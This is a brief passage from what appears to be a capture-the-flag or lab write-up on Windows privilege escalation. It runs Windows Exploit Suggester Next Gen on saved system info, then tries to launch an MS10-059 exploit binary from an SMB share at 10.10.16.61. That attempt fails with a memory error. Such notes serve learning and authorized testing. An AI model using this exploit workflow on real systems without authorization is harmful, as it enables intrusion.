We can use Wesng (Windows Exploit Suggestion Next Gen) to find priv esc vulns 


We store the system info into system info txt and find a lot of vulns

```
sudo python3 wes.py systeminfo.txt
```

A problem on  the box is preventing us from running this exploit 

```
\\10.10.16.61\tmp\MS10-059.exe                                                      
Program too big to fit in memory
```